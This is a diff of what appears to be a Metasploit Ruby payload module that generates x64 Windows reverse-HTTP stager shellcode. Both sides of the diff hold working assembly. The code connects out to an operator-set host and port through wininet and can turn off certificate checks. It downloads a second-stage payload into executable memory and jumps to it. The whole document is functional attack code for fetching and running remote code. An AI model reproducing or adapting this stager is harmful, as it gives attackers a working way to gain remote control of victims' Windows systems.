@@ -73,12 +73,12 @@ module Payload::Windows::ReverseHttp_x64
   #
   def generate_reverse_http(opts={})
     combined_asm = %Q^
-      cld                    ; Clear the direction flag.
-      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned 
-      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+      cld                 ; Clear the direction flag.
+      and rsp, ~0xf       ; Ensure RSP is 16 byte aligned
+      call start          ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
-        pop rbp
+        pop rbp           ; rbp now contains the block API pointer
       #{asm_reverse_http(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
@@ -198,190 +198,166 @@ module Payload::Windows::ReverseHttp_x64
     end
 
     asm = %Q^
-      xor rbx, rbx
-
       load_wininet:
-        push rbx
+        push 0                        ; stack alignment
         mov r14, 'wininet'
         push r14                      ; Push 'wininet',0 onto the stack
         mov r14, rsp                  ; Save pointer to string
         mov rcx, r14                  ; the name of the lib to load
-        mov r10, 0x0726774C           ; hash( "kernel32.dll", "LoadLibraryA" )
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp
 
       internetopen:
+        push 0                        ; stack alignment
+        push 0                        ; NULL pointer
+        mov rcx, rsp                  ; lpszAgent ("")
     ^
 
     if proxy_enabled
       asm << %Q^
-      call get_proxy_server
-        db "#{proxy_info}", 0x00
-      get_proxy_server:
-        pop r8                        ; stack pointer (lpszProxyName)
-        push 3                        ; INTERNET_OPEN_TYPE_PROXY = 3 (dwAccessType)
-        pop rdx
+        push 3
+        pop rdx                       ; dwAccessType (3=INTERNET_OPEN_TYPE_PROXY)
+        call load_proxy_name
+        db "#{proxy_info}",0x0        ; proxy information
+      load_proxy_name:
+        pop r8                        ; lpszProxyName (stack pointer)
       ^
     else
       asm << %Q^
-        xor r8, r8                    ; NULL pointer (lpszProxyName)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx
-        pop rdx                       ; PRECONFIG = 0 (dwAccessType)
+        xor rdx, rdx                  ; dwAccessType (0=INTERNET_OPEN_TYPE_PRECONFIG)
+        xor r8, r8                    ; lpszProxyName (NULL)
       ^
     end
 
     asm << %Q^
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
-        xor r9, r9                    ; NULL pointer (lpszProxyBypass)
-        mov rcx, rsp                  ; Empty string pointer (lpszAgent)
-        push rbx                      ; 0 (dwFlags)
-        push rbx                      ; 0 for alignment
-        mov r10, 0xA779563A           ; hash( "wininet.dll", "InternetOpenA" )
+        xor r9, r9                    ; lpszProxyBypass (NULL)
+        push rax                      ; stack alignment
+        push 0                        ; dwFlags (0)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call rbp
-    ^
 
-    asm << %Q^
-        call internetconnect          ; puts proxy host pointer on stack
-      get_server_host:
-        db "#{opts[:host]}", 0x00
+        jmp dbl_get_server_host
 
       internetconnect:
-        pop rdx                       ; contains proxy host pointer
-        mov rcx, rax                  ; HINTERNET (hInternet)
-        mov r8, #{opts[:port]}        ; 
-        xor r9, r9                    ; String (lpszUsername)
-        push rbx                      ; NULL (dwContext)
-        push rbx                      ; 0 (dwFlags)
-        push 3                        ; INTERNET_SERVICE_HTTP (dwService)
-        push rbx                      ; 0 for alignment
-        mov r10, 0xC69F8957           ; hash( "wininet.dll", "InternetConnectA" )
+        pop rdx                       ; lpszServerName
+        mov rcx, rax                  ; hInternet
+        mov r8, #{opts[:port]}        ; nServerPort
+        xor r9, r9                    ; lpszUsername (NULL)
+        push r9                       ; dwContent (0)
+        push r9                       ; dwFlags (0)
+        push 3                        ; dwService (3=INTERNET_SERVICE_HTTP)
+        push r9                       ; lpszPassword (NULL)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
         call rbp
     ^
 
-    if proxy_enabled
-      # only store connection handle if something is set!
-      if proxy_user || proxy_pass
-        asm << %Q^
+    if proxy_enabled && (proxy_user || proxy_pass)
+      asm << %Q^
         mov rsi, rax                  ; Store hConnection in rsi
-        ^
-      end
+      ^
 
       if proxy_user
         asm << %Q^
-        call internetsetoption_proxy_user ; puts proxy_user pointer on stack
-      get_proxy_user:
+        call load_proxy_user          ; puts proxy_user pointer on stack
         db "#{proxy_user}", 0x00
-      internetsetoption_proxy_user:
-        pop r8                        ; contains proxy_user pointer
-        mov rcx, rsi                  ; (hConnection)
-        push 43                       ; INTERNET_OPTION_PROXY_USERNAME
+      load_proxy_user:
+        pop r8                        ; lpBuffer (stack pointer)
+        mov rcx, rsi                  ; hConnection (connection handle)
+        push 43                       ; (43=INTERNET_OPTION_PROXY_USERNAME)
         pop rdx
-        push #{proxy_user.length}     ; proxy_user length
+        push #{proxy_user.length}     ; dwBufferLength (proxy_user length)
         pop r9
-        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
-        ; TODO: Without these pushes, things crashed. Not sure why.
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
       end
 
       if proxy_pass
         asm << %Q^
-        call internetsetoption_proxy_pass ; puts proxy_pass pointer on stack
-      get_proxy_pass:
+        call load_proxy_pass          ; puts proxy_pass pointer on stack
         db "#{proxy_pass}", 0x00
-      internetsetoption_proxy_pass:
-        pop r8                        ; contains proxy_pass pointer
-        mov rcx, rsi                  ; (hConnection)
-        push 44                       ; INTERNET_OPTION_PROXY_PASSWORD
+      load_proxy_pass:
+        pop r8                        ; lpBuffer (stack pointer)
+        mov rcx, rsi                  ; hConnection (connection handle)
+        push 44                       ; (43=INTERNET_OPTION_PROXY_PASSWORD)
         pop rdx
-        push #{proxy_pass.length}     ; proxy_pass length
+        push #{proxy_pass.length}     ; dwBufferLength (proxy_pass length)
         pop r9
-        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
-        ; TODO: Without these pushes, things crashed. Not sure why.
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
         ^
       end
 
-      if proxy_user || proxy_pass
-        asm << %Q^
+      asm << %Q^
         mov rax, rsi                  ; Restore hConnection in rax
-        ^
-      end
+      ^
     end
 
     asm << %Q^
-        call httpopenrequest
-      get_server_uri:
-        db "#{opts[:url]}",0x00
+
+        jmp get_server_uri
 
       httpopenrequest:
-        pop r8                        ; String (lpszObjectName)
-        mov rcx, rax                  ; HINTERNET (hConnect)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx
-        pop rdx                       ; NULL pointer (lpszVerb)
-        xor r9, r9                    ; String (lpszVersion)
-        push rbx                      ; 0 (dwContext)
-        ; TODO: figure out what's going on here (get help from HD?)
-        ; Having to use mov + push instead of push qword because
-        ; Metasm doesn't seem to like it. Plain 'push' doesn't work
-        ; because of an overflow error.
-        ;push qword 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
-        mov r10, 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
+        mov rcx, rax                  ; hConnect
+        xor rdx, rdx                  ; lpszVerb (NULL=GET)
+        pop r8                        ; lpszObjectName (URI)
+        xor r9, r9                    ; lpszVersion (NULL)
+        push rdx                      ; dwContext (0)
+        mov r10, #{"0x%.8x" % http_open_flags}  ; dwFlags
         push r10
-        push rbx                      ; NULL pointer (lplpszAcceptTypes)
-        push rbx                      ; NULL pointer (lpszReferer)
-        mov r10, 0x3B2E55EB           ; hash( "wininet.dll", "HttpOpenRequestA" )
+        push rdx                      ; lplpszAcceptType (NULL)
+        push rdx                      ; lpszReferer (NULL)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call rbp
-        mov rsi, rax                  ; Store the request handle in RSI
 
-      retry_setup:
+      prepare:
+        mov rsi, rax
         push #{retry_count}
         pop rdi
 
-      retry:
-      ^
+      retryrequest:
+    ^
 
     if opts[:ssl]
       asm << %Q^
-      internetsetoption_ssl:
-        mov rcx, rsi                  ; (hInternet)
-        push 31                       ; INTERNET_OPTION_SECURITY_FLAGS
-        pop rdx
-        push rbx                      ; 0 for alignment
-        push #{set_option_flags}      ; (dwFlags)
-        mov r8, rsp
-        push 4                        ; sizeof(dwFlags)
-        pop r9
-        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
+      internetsetoption:
+        mov rcx, rsi                  ; hInternet (request handle)
+        mov rdx, 31                   ; dwOption (31=INTERNET_OPTION_SECURITY_FLAG)
+        push 0                        ; stack alignment
+        push #{"0x%.8x" % set_option_flags}  ; flags
+        mov r8, rsp                   ; lpBuffer (pointer to flags)
+        mov r9, 4                     ; dwBufferLength (4 = size of flags)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
       ^
     end
 
     asm << %Q^
       httpsendrequest:
-        mov rcx, rsi                  ; HINTERNET (hRequest)
-        ; the push/pop sequence saves a byte over XOR
-        push rbx
-        pop rdx                       ; NULL pointer (lpszHeaders)
-        xor r8, r8                    ; 0 (dwHeadersLength)
-        xor r9, r9                    ; NULL pointer (lpOptional)
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 (dwOptionalLength)
-        mov r10, 0x7B18062D           ; hash( "wininet.dll", "HttpSendRequestA" )
+        mov rcx, rsi                  ; hRequest (request handle)
+        xor rdx, rdx                  ; lpszHeaders (NULL)
+        xor r8, r8                    ; dwHeadersLen (0)
+        xor r9, r9                    ; lpszVersion (NULL)
+        push rdx                      ; stack alignment
+        push rdx                      ; dwOptionalLength (0)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call rbp
-        test eax, eax                 ; use eax, it's 1 byte less than rax
+        test eax, eax
         jnz allocate_memory
 
       try_it_again:
-        dec edi                       ; use edi, it's 1 byte less than rdi
+        dec rdi
         jz failure
-        jmp retry
+        jmp retryrequest
+
+      dbl_get_server_host:
+        jmp get_server_host
+
+      get_server_uri:
+        call httpopenrequest
+
+      server_uri:
+        db "#{opts[:url]}",0x0
     ^
 
     if opts[:exitfunk]
@@ -392,52 +368,56 @@ module Payload::Windows::ReverseHttp_x64
     else
       asm << %Q^
       failure:
-        push 0x56A2B5F0           ; hardcoded to exitprocess for size
+        push 0                        ; stack alignment
+        push 0x56A2B5F0               ; hardcoded to exitprocess for size
         call rbp
       ^
     end
 
     asm << %Q^
       allocate_memory:
-        ; the push/pop sequence saves a byte over XOR
-        push rbx
-        pop rcx                     ; NULL pointer (lpAddress)
-        mov rdx, 0x00400000         ; SIZE_T (dwSize)
-        mov r8, 0x1000              ; MEM_COMMIT (flAllocationType)
-        push 0x40
-        pop r9                      ; PAGE_EXECUTE_READWRITE (flProtect)
-        mov r10, 0xE553A458         ; hash( "kernel32.dll", "VirtualAlloc" )
-        call rbp                    ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+        xor rcx, rcx                  ; lpAddress (NULL)
+        mov rdx, 0x00400000           ; dwSize (4 MB)
+        mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
+        mov r9, 0x40                  ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        call rbp
 
       download_prep:
-        xchg rax, rbx               ; place the allocated base address in ebx
-        push rbx                    ; store a copy of the stage base address on the stack
-        push rbx                    ; temporary storage for bytes read count
-        mov rdi, rsp                ; &bytesRead
+        xchg rax, rbx                 ; store the allocated base in rbx
+        push rbx                      ; store a copy for later
+        push rbx                      ; temp storage for byte count
+        mov rdi, rsp                  ; rdi is the &bytesRead
 
       download_more:
-        mov rcx, rsi                ; HINTERNET (hFile)
-        mov rdx, rbx                ; (lpBuffer)
-        mov r8, 8192                ; (dwNumberOfBytesToRead)
-        mov r9, rdi                 ; (lpNumberOfBytesRead)
-        mov r10, 0xE2899612         ; hash( "wininet.dll", "InternetReadFile" )
+        mov rcx, rsi                  ; hFile (request handle)
+        mov rdx, rbx                  ; lpBuffer (pointer to mem)
+        mov r8, 8192                  ; dwNumberOfBytesToRead (8k)
+        mov r9, rdi                   ; lpdwNumberOfByteRead (stack pointer)
+        mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
         call rbp
-        add rsp, 32                 ; clean up reserved space
+        add rsp, 32                   ; clean up reserved space
 
-        test eax, eax               ; did the download fail?
+        test eax, eax                 ; did the download fail?
         jz failure
 
-        mov ax, word ptr [rdi]
-        ; Use ebx/eax here because we save bytes (don't need higher order 32 bits)
-        add ebx, eax                ; buffer += lpNumberOfBytesRead
+        mov ax, word ptr [rdi]        ; extract the read byte count
+        add rbx, rax                  ; buffer += bytes read
 
-        test eax, eax               ; use eax instead of rax, saves a byte
-        jnz download_more           ; loop until 0 is returned
-        pop rax                     ; clear temp storage
-        pop rax                     ; alignment
+        test rax, rax                 ; are we done?
+        jnz download_more             ; keep going
+        pop rax                       ; clear up reserved space
+        pop rax                       ; realign again
 
       execute_stage:
-        ret                         ; dive into the stored stage address
+        ret                           ; return to the stored stage address
+
+      get_server_host:
+        call internetconnect
+
+      server_host:
+        db "#{opts[:host]}",0x0
+
     ^
 
     if opts[:exitfunk]
